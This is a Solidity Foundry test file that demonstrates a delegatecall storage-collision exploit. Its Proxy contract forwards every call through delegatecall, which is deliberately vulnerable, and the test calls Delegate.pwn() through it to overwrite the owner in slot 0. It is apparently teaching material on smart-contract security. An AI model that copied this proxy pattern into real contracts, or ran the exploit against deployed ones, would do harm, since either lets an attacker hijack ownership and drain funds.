// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// Proxy Contract is designed for helping users call logic contract
// Proxy Contract's owner is hardcoded as 0xdeadbeef
// Can you manipulate Proxy Contract's owner ?

contract Proxy {

  address public owner = address(0xdeadbeef); // slot0
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
  }

  fallback() external {
    (bool suc,) = address(delegate).delegatecall(msg.data);  // vulnerable
    require(suc, "Delegatecall failed");
  }
}

contract ContractTest is Test {
    Proxy proxy;
    Delegate DelegateContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        DelegateContract = new Delegate();              // logic contract
        proxy = new Proxy(address(DelegateContract));   // proxy contract
        
        console.log("Alice address", alice);
        console.log("DelegationContract owner", proxy.owner());
        
        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
        console.log("Change DelegationContract owner to Alice...");
        vm.prank(alice);   
        address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
        // Proxy.fallback() will delegatecall Delegate.pwn()

        console.log("DelegationContract owner", proxy.owner());
        console.log("Exploit completed, proxy contract storage has been manipulated");
    }
}

contract Delegate {
  address public owner; // slot0

  function pwn() public {
    owner = msg.sender;
  }
}


